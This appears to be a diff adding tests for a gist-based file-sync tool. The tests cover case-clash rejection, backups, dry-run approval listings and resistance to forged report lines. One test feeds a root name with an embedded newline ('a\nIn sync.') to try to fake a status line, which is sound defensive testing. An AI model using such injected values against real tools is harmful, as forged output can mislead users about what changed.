+    await rejectsWith(pull(v.env, {}), "BAD_MANIFEST", /differ only in case/);
+    assert.deepEqual(await readdir(v.bin), []);
+  });
+
+  it("two pulls in the same millisecond keep separate backups", async () => {
+    const { a, b } = await rootPair();
+    const fixed = () => new Date(Date.UTC(2026, 10, 5, 12, 0, 0));
+    const env = { ...b.env, now: fixed };
+    const dirs: string[] = [];
+    for (const v of ["one", "two"]) {
+      await put(a.bin, { piwt: `${v}\n` });
+      await sync.push(a.env, {});
+      await put(b.bin, { piwt: `local-${v}\n` });
+      const res = await pull(env, { force: true });
+      dirs.push(res.backupDir as string);
+      assert.match(res.lines.join("\n"), new RegExp(`Backed up 1 file\\(s\\) to ${BACKUP_DIR}/${basename(res.backupDir as string)}`));
+    }
+    assert.notEqual(dirs[0], dirs[1]);
+    assert.equal(await readFile(join(dirs[0] as string, "@local-bin", "piwt"), "utf8"), "local-one\n");
+    assert.equal(await readFile(join(dirs[1] as string, "@local-bin", "piwt"), "utf8"), "local-two\n");
+  });
+
+  it("a dry run lists every file that needs approval, with its destination", async () => {
+    const v = await victim({ "local-bin": { dir: "~/.local/bin", include: ["*"], exclude: [] } });
+    craft(v.fake, v.gistId, Array.from({ length: 25 }, (_, i) => ({ path: `@local-bin/s${i}`, content: `#!/bin/sh\n# ${i}\n` })));
+    const res = await sync.pull(v.env, { dryRun: true });
+    const text = res.lines.join("\n");
+    const realBin = await realpath(v.bin);
+    assert.match(text, /Would ask before changing \(25\):/);
+    for (let i = 0; i < 25; i++) assert.ok(text.includes(`  add @local-bin/s${i} -> ${join(realBin, `s${i}`)}`), `s${i}`);
+  });
+
+  it("a newline in a root name cannot forge a report line", async () => {
+    const v = await victim({ "a\nIn sync.": { dir: "~/.local/bin", include: ["*"], exclude: [] } });
+    const lines = (await sync.status(v.env)).lines;
+    assert.ok(lines.some((l) => l.startsWith('Root "a?In sync." ignored')));
+    assert.ok(!lines.includes("In sync.\" ignored: invalid name: use 1 to 32 of a-z, 0-9 and -, starting with a letter or digit"));
+  });
+});
+
